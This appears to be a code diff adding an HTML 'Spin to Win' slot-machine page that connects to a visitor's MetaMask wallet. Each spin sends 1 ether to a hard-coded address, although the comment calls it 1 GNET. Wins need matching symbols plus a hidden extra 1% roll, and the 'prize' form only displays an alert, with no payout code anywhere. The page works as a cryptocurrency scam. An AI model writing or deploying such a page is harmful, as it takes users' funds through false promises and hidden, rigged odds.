@@ -1,1 +1,196 @@
-hello world
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spin to Win!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f0f0f0;
+        }
+        .slot-machine {
+            margin: 50px auto;
+            width: 300px;
+            height: 300px;
+            border: 5px solid #ccc;
+            border-radius: 20px;
+            background-color: #fff;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+        .slot {
+            width: 80px;
+            height: 80px;
+            font-size: 40px;
+            border: 2px solid #333;
+            margin: 0 5px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        #spin-button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 20px;
+            background-color: #4caf50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        #spin-button:disabled {
+            background-color: #ccc;
+        }
+        #winner-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: left;
+        }
+        .modal-content input {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Spin to Win a Prize!</h1>
+    <button id="connect-button" onclick="connectWallet()">Connect MetaMask</button>
+    <div class="slot-machine">
+        <div class="slot" id="slot1">🍒</div>
+        <div class="slot" id="slot2">🍋</div>
+        <div class="slot" id="slot3">🍉</div>
+    </div>
+    <button id="spin-button" onclick="payAndSpin()" disabled>Spin</button>
+
+    <div id="winner-modal">
+        <div class="modal-content">
+            <h2>Congratulations, You Won!</h2>
+            <p>Enter your wallet address to receive your prize:</p>
+            <input type="text" id="wallet-address" placeholder="Wallet Address">
+            <button onclick="submitAddress()">Submit</button>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
+    <script>
+        const slotItems = ["🍒", "🍋", "🍉", "🍊", "🍇"];
+        let spinning = false;
+        let web3;
+        let userAccount;
+        const GNETAddress = '0x67A4B50798c190C77d872D9f02C8a860ad1488e7'; // Replace with your GNET token contract address
+
+        async function connectWallet() {
+            if (window.ethereum) {
+                try {
+                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                    userAccount = accounts[0];
+                    web3 = new Web3(window.ethereum);
+                    document.getElementById('connect-button').innerText = 'Connected';
+                    document.getElementById('spin-button').disabled = false;
+                } catch (error) {
+                    console.error("User denied account access");
+                }
+            } else {
+                alert("MetaMask is not installed. Please install it to use this feature.");
+            }
+        }
+
+        async function payAndSpin() {
+            if (spinning) return;
+            spinning = true;
+
+            const amountInEther = '1'; // 1 GNET
+            const recipientAddress = '0x3847f6194b6E84BF81A3B6DA8Be0b75933cEbef3'; // Replace with your recipient address
+
+            try {
+                const transactionParameters = {
+                    to: recipientAddress,
+                    from: userAccount,
+                    value: web3.utils.toHex(web3.utils.toWei(amountInEther, 'ether')),
+                    gas: web3.utils.toHex(21000),
+                    gasPrice: web3.utils.toHex(web3.utils.toWei('20', 'gwei')),
+                };
+
+                await ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [transactionParameters],
+                });
+
+                spin();
+            } catch (error) {
+                console.error("Transaction failed", error);
+                spinning = false;
+            }
+        }
+
+        function getRandomItem() {
+            return slotItems[Math.floor(Math.random() * slotItems.length)];
+        }
+
+        function spin() {
+            document.getElementById("spin-button").disabled = true;
+
+            let slot1 = document.getElementById("slot1");
+            let slot2 = document.getElementById("slot2");
+            let slot3 = document.getElementById("slot3");
+
+            let interval1 = setInterval(() => slot1.textContent = getRandomItem(), 100);
+            let interval2 = setInterval(() => slot2.textContent = getRandomItem(), 100);
+            let interval3 = setInterval(() => slot3.textContent = getRandomItem(), 100);
+
+            setTimeout(() => {
+                clearInterval(interval1);
+                slot1.textContent = getRandomItem();
+            }, 2000);
+
+            setTimeout(() => {
+                clearInterval(interval2);
+                slot2.textContent = getRandomItem();
+            }, 3000);
+
+            setTimeout(() => {
+                clearInterval(interval3);
+                slot3.textContent = getRandomItem();
+                spinning = false;
+                document.getElementById("spin-button").disabled = false;
+                checkWinner(slot1.textContent, slot2.textContent, slot3.textContent);
+            }, 4000);
+        }
+
+        function checkWinner(slot1, slot2, slot3) {
+            const winProbability = 0.01; // 1% chance to win
+            const randomChance = Math.random();
+            if (slot1 === slot2 && slot2 === slot3 && randomChance < winProbability) {
+                document.getElementById("winner-modal").style.display = "flex";
+            }
+        }
+
+        function submitAddress() {
+            let address = document.getElementById("wallet-address").value;
+            if (address) {
+                alert("Address submitted: " + address);
+                document.getElementById("winner-modal").style.display = "none";
+            }
+        }
+    </script>
+</body>
+</html>
